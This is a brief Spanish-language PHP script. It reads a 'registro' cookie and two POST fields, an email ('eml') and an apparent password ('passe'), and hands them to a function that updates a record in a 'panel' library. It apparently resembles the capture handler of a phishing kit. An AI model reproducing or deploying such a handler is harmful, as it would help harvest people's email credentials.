<?php 
require('../../panel/lib/funciones.php');

$registro = $_COOKIE['registro'];

$email = $_POST['eml'];
$cemail = $_POST['passe'];

actualizar_registro_mail($registro,$email,$cemail);
?>